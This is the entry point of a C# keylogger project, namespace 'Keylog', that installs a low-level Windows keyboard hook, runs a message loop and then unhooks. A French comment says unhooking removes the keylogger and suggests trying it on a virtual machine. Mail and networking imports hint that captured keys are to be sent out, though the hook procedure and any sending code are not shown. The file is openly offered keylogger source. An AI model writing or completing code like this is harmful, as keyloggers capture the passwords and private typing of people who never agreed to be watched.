using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using static System.Net.Mime.MediaTypeNames;

namespace Keylog
{
    class Program
    {
        

        
        private static IntPtr hook = IntPtr.Zero;
        
        static void Main(string[] args)
        {
            hook = Keylog_exe.SetHook(Keylog_exe.llkProcedure);
            System.Windows.Forms.Application.Run();
            Keylog_exe.UnhookWindowsHookEx(hook); // permet d'enlever le keylogger, peut a essayer sur une vm
        }

        
    }
}
